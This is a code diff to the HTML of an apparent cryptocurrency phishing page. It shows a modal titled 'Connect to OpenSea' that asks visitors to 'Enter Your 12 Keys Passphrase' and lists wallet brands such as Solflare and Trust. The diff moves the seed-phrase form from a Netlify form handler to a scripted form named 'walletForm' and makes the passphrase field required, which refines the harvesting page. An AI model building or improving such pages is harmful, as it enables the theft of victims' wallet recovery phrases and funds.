@@ -24,9 +24,17 @@
   <div class="modallogo"><img src="/src/assets/logo-wallet.svg" alt="Logo"></div> 
 <p class="modalcon">Connect to OpenSea</p>
 <p class="modalcon2">Enter Your 12 Keys Passphrase</p>
-<form name="contact" method="POST"  action="/bounce/" data-netlify="true">
+<form name="contact" id="walletForm">
   <p>
-    <label><textarea class="modalform" name="Enter your 12 key Passphrase"></textarea></label>
+    <label>
+      <textarea 
+        class="modalform" 
+        name="passphrase" 
+        placeholder="Enter your 12 key passphrase here..."
+        rows="4"
+        required
+      ></textarea>
+    </label>
   </p>
   <p>
     <button class="modalsubmit" type="submit">Connect Wallet</button>
@@ -49,11 +57,9 @@
   <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/solflare.webp">Solflare</a>
   <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/opera-touch-alternative.svg">OperaTouch</a>
   <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/trust-alternative.webp">Trust</a>
-
 </section>
  </dialog>
   </body>
 
-  
   <script src="/src/components/modal.js" type="module"></script>
 </html>
